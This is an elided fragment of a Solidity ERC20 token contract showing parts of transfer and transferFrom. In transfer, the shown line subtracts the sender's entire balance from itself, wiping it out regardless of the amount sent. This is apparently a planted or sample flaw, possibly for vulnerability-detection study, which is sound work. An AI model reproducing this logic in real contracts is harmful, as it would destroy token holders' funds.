...
contract ERC20Standard {
	...
	function transfer(address _recipient, uint _value) public onlyPayloadSize(2*32) {
	    ...
	    balances[msg.sender] = balances[msg.sender].sub(balances[msg.sender]); 
	...
	function transferFrom(address _from, address _to, uint _value) public {
		require(_value > 0, "Amount <= 0");
	    require(balances[_from] >= _value, "Balance < amount");
		require(allowed[_from][msg.sender] >= _value, "Don't allowed.");
